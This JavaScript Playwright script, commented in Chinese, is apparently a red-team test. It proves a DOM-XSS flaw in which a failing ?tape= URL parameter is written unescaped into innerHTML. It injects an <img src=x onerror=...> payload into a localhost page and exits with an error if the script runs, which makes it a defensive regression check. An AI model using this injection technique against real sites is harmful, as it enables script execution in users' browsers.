// 红队C' — ?tape= DOM-XSS 证明。
// main.js boot().catch 把 err 原样插入 innerHTML；loadTape 失败抛 `找不到带子：${name}`，
// name = URL 参数 tape。构造一个失败带名把 <img onerror> 送进 DOM。
import { chromium } from 'playwright';

const PORT = process.argv[2] ?? '8934';
const browser = await chromium.launch({ headless: true });
const page = await browser.newPage();
let xssFired = false;
page.on('dialog', async (d) => { xssFired = true; console.log('XSS DIALOG:', d.message()); await d.dismiss(); });
await page.exposeFunction('__xss', () => { xssFired = true; });

// payload：带名里塞 <img src=x onerror=window.__xss()>
const payload = `zzz"><img src=x onerror="window.__xss()">`;
const url = `http://localhost:${PORT}/?tape=${encodeURIComponent(payload)}`;
console.log('goto', url);
await page.goto(url, { waitUntil: 'load', timeout: 30000 });
await page.waitForTimeout(2500);

// DOM 里是否出现活的 <img onerror>（而非被转义的文本）？
const injected = await page.evaluate(() => {
  const imgs = [...document.querySelectorAll('pre img')];
  return { imgCount: imgs.length, preHTML: (document.querySelector('pre')?.innerHTML ?? '').slice(0, 200) };
});
console.log('injected-img-in-pre:', injected.imgCount, '| pre.innerHTML:', JSON.stringify(injected.preHTML));
console.log('XSS-FIRED:', xssFired);
await browser.close();
process.exit(xssFired || injected.imgCount > 0 ? 1 : 0);
